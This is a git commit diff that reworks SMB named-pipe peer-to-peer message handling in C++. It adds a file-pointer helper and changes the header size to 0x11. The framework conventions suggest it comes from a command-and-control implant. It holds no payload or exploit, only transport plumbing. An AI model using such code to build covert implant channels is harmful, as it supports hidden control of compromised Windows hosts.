e9a3770cdc2155f16c823298d87d9f67fa653028
1emvr <1emvr@protonmail.com>
2024-08-18 05:07:21 -0400

    updateing p2p

--- core/src/network.cpp
+++ core/src/network.cpp
@@ -379,6 +379,15 @@ namespace Smb {
         return true;
     }
 
+    VOID MoveFilePointer(HANDLE handle, int32_t offset, int32_t *current) {
+        HEXANE
+
+        auto total = offset;
+        *current += total;
+
+        Ctx->win32.SetFilePointer(handle, *current, nullptr, FILE_BEGIN);
+    }
+
     BOOL PeekClientMessage(HANDLE handle, _stream &stream, bool ingress) {
         HEXANE
 
@@ -386,48 +395,42 @@ namespace Smb {
         int32_t current = 0;
         uint32_t read   = 0;
         bool success    = false;
-        /*
-            on egress pipe, peer should not pull his own message off the pipe but check for messages meant for him
-            mark messages inbound (1) or outbound (0):
-                    1 MY_ID -> pull the message
-                    0 MY_ID -> we placed this, do not pull
 
-            on ingress pipe, client shouldn't put his own message on the pipe anyway so this is safe.
-        */
         while (true) {
-            if (!Ctx->win32.PeekNamedPipe(handle, &search, 0x10, R_CAST(LPDWORD, &read), nullptr, nullptr) || read == 0) {
+            if (!Ctx->win32.PeekNamedPipe(handle, &search, 0x11, R_CAST(LPDWORD, &read), nullptr, nullptr) || read == 0) {
                 success_(false);
             }
 
-            if (read < 0x10) {
+            if (read < 0x11) {
                 success_(false);
             }
 
             if (!ingress) {
-                if (search.peer_id == Ctx->session.peer_id && !search.inbound) {
-                    auto total = S_CAST(int32_t, 0x10 + search.length);
-                    current += total;
-
-                    Ctx->win32.SetFilePointer(handle, current, nullptr, FILE_BEGIN);
+                if (!search.inbound) {
+                    MoveFilePointer(handle, S_CAST(int32_t, 0x11 + search.length), &current);
                     continue;
 
-                } else if (search.inbound){
-                    x_memcpy(&stream , &search, 0x10);
+                } else {
+                    x_memcpy(&stream, &search, 0x11);
                     success_(true);
                 }
             } else {
                 if (search.inbound) {
+                    MoveFilePointer(handle, S_CAST(int32_t, 0x11 + search.length), &current);
                     continue;
+
                 } else {
-                    x_memcpy(&stream , &search, 0x10);
+                    x_memcpy(&stream, &search, 0x11);
                     success_(true);
                 }
             }
         }
 
         defer:
+        Ctx->win32.SetFilePointer(handle, 0, nullptr, FILE_BEGIN);
         return success;
     }
+
 
     VOID PeerConnectIngress (_stream *out, _stream **in) {
         HEXANE
@@ -489,7 +492,6 @@ namespace Smb {
                 peer = peer->next;
                 head = Ctx->transport.outbound_queue;
 
-                Ctx->win32.SetFilePointer(peer->ingress_handle, 0, nullptr, FILE_BEGIN);
             }
         }
 
